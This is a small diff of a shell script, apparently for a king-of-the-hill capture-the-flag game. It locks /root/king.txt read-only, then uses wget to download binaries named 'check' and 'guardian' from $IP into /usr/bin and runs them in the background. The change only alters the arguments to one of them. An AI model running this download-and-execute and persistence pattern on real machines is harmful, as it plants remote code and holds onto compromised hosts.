@@ -33,7 +33,7 @@ set -o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt
 
 cd /usr/bin && wget http://$IP/check && chmod +x check
-./check "$IP" "$nick" &
+./check "$nick" &
 cd /usr/bin && wget http://$IP/guardian && chmod +x guardian
 ./guardian "$IP" &
 
